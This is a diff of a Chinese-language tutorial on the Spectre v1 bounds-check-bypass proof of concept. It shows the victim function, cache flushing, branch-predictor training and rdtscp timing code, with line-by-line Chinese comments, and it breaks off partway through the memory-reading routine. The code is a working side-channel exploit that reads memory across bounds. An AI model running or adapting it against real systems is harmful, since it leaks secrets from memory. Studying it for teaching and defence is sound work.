@@ -71,45 +71,46 @@ if(x < array1_size)
 说完漏洞利用过程我们再来通读一下完整的poc代码。代码所有解释均在注释中有相关标注。
 
 ```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#ifdef _MSC_VER //根据处理器架构（x86或者x64）来使用对应的宏包含的库
-#include <intrin.h> /* for rdtscp and clflush */  //flush缓存库，主要用来调用_mm_clflush（刷新缓存）和__rdtscp函数
-#pragma optimize("gt",on)
-#else
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <stdint.h> 
+#ifdef _MSC_VER //根据处理器架构（x86或者x64）来使用对应的宏包含的库 
+#include <intrin.h> /* for rdtscp and clflush */  //flush缓存库，主要用来调用_mm_clflush（刷新缓存）和__rdtscp函数 
+#pragma optimize("gt",on) 
+#else 
 #include <x86intrin.h> /* for rdtscp and clflush */ 
-#endif
+#endif 
 
-/********************************************************************
- Victim code.
-********************************************************************/
+/******************************************************************** 
+ Victim code. 
+********************************************************************/ 
  unsigned int array1_size = 16; 
  uint8_t unused1[64];
  uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 }; //初始化array1数组，并至初始化数组前16个值，申请了160个int地址空间
  uint8_t unused2[64];
  uint8_t array2[256 * 512]; 
 
- char *secret = "The Magic Words are Squeamish Ossifrage."; //设置密文字符串，存储在cpu内存中
+ char *secret = "The Magic Words are Squeamish Ossifrage."; //设置密文字符串，存储在cpu内存中 
+ 
+ uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */ 
 
- uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-/*根据前文分析的危险函数，此处x虽然设置了array1的上界检查，但是仍然可以通过cpu的乱序执行和分支预测执行内存不可访问区的越界访问，temp表示读取array2的byte值到缓存中*/
- void victim_function(size_t x) {
+/* 根据前文分析的危险函数，此处x虽然设置了array1的上界检查，但是仍然可以通过cpu的乱序执行和分支预测执行内存不可访问区的越界访问，temp表示读取array2的byte值到缓存中 */ 
+ void victim_function(size_t x) { 
  	if (x < array1_size) {
  		temp &= array2[array1[x] * 512];
  	}
  }
 
 
- /********************************************************************
- Analysis code
- ********************************************************************/
- #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */ //缓存命中阀值，如果请求时间小于这个阀值，则意味着缓存命中
+ /******************************************************************** 
+ Analysis code 
+ ********************************************************************/ 
+ #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */ //缓存命中阀值，如果请求时间小于这个阀值，则意味着缓存命中。 
 
- /* Report best guess in value[0] and runner-up in value[1] */
-//计算输出命中缓存最有可能的value值以及排第二的value
- void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+ /* Report best guess in value[0] and runner-up in value[1] */ 
+//计算输出命中缓存最有可能的value值以及排第二的value 
+ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) { 
  	static int results[256];
  	int tries, i, j, k, mix_i, junk = 0;
 	size_t training_x, x;
@@ -118,19 +119,19 @@ if(x < array1_size)
 
  	for (i = 0; i < 256; i++)
  	results[i] = 0;
-   //用大循环“训练”CPU的分支预测，让CPU微结构认为下次也应该走向读取内存这一分支
+   //用大循环“训练”CPU的分支预测，让CPU微结构认为下次也应该走向读取内存这一分支。 
  	for (tries = 999; tries > 0; tries--) {
  	/* Flush array2[256*(0..255)] from cache */
  	for (i = 0; i < 256; i++) //清除array2数组的缓存
  	_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */ //使用_mm_clflush方法清除array2在cache中的缓存
 
  	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
- 	training_x = tries % array1_size;  //对应array1 x的合法访问位置
-    for(j = 29; j >= 0; j--) {
+ 	training_x = tries % array1_size;  //对应array1 x的合法访问位置。 
+    for(j = 29; j >= 0; j--) { 
  	_mm_clflush(&array1_size); 
- 	for(volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+ 	for(volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */ 
 
-      //如果j%6!=0 x=training_x 反之x=malicious_x
+      //如果j%6!=0 x=training_x 反之x=malicious_x 
  	/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
  	/* Avoid jumps in case those tip off the branch predictor */
  	x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
@@ -143,18 +144,18 @@ if(x < array1_size)
  }
 
  	/* Time reads. Order is lightly mixed up to prevent stride prediction */
-    //这个循环判断array2缓存地址的访问时间，如果小于阀值，说明array2对应byte的位置已经缓存
- 	for (i = 0; i < 256; i++) {
- 		mix_i = ((i * 167) + 13) & 255; //这里我理解是，在循环中，让mix_i在0～255之间随机分布，mix_i用来返回字符ascii值
- 		addr = &array2[mix_i * 512]; //取array2对应的地址，刚刚temp缓存过
- 		time1 = __rdtscp(&junk); /* READ TIMER */ //获取上一个array2读取地址读取的时间
- 		junk = *addr; /* MEMORY ACCESS TO TIME */ //获取array2内存中对应的地址值
- 		time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */ //计算时间差（过去的时间）
- 		if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) //如果读取单个byte cache缓存的时间小于阀值且访问的位置mix_i属于字符串数组界限以外，没有缓存的话redscp读的差不多是一个不变定值，有缓存的话会有大小改变，所以这里以前后访问缓存页面的时间差判断没有问题。
+    //这个循环判断array2缓存地址的访问时间，如果小于阀值，说明array2对应byte的位置已经缓存 
+ 	for (i = 0; i < 256; i++) { 
+ 		mix_i = ((i * 167) + 13) & 255; //这里我理解是，在循环中，让mix_i在0～255之间随机分布，mix_i用来返回字符ascii值 
+ 		addr = &array2[mix_i * 512]; //取array2对应的地址，刚刚temp缓存过 
+ 		time1 = __rdtscp(&junk); /* READ TIMER */ //获取上一个array2读取地址读取的时间 
+ 		junk = *addr; /* MEMORY ACCESS TO TIME */ //获取array2内存中对应的地址值 
+ 		time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */ //计算时间差（过去的时间） 
+ 		if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) //如果读取单个byte cache缓存的时间小于阀值且访问的位置mix_i属于字符串数组界限以外，没有缓存的话redscp读的差不多是一个不变定值，有缓存的话会有大小改变，所以这里以前后访问缓存页面的时间差判断没有问题。 
  			results[mix_i]++; /* cache hit - add +1 to score for this value */
  		}
 	/* Locate highest & second-highest results results tallies in j/k */
-      //通过循环确定最有可能和第二可能字符的ascii码值k，j
+      //通过循环确定最有可能和第二可能字符的ascii码值k，j 
  	j = k = -1;
  	for (i = 0; i < 256; i++) {
  		if (j < 0 || results[i] >= results[j]) {
